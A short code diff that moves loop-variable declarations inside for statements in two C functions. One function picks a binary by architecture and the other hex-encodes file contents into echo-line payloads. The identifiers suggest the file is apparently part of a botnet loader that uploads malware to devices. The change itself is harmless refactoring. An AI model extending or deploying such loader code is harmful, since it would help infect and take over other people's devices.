@@ -43,9 +43,9 @@ BOOL binary_init(void)
 
 struct binary *binary_get_by_arch(char *arch)
 {
-    int i;
+    //int i;
 
-    for (i = 0; i < bin_list_len; i++)
+    for (int i = 0; i < bin_list_len; i++)
     {
         if (strcmp(arch, bin_list[i]->arch) == 0)
             return bin_list[i];
@@ -69,13 +69,13 @@ static BOOL load(struct binary *bin, char *fname)
     while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
     {
         char *ptr;
-        int i;
+        //int i;
 
         bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
         bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
         ptr = bin->hex_payloads[bin->hex_payloads_len++];
 
-        for (i = 0; i < n; i++)
+        for (int i = 0; i < n; i++)
             ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
     }
 
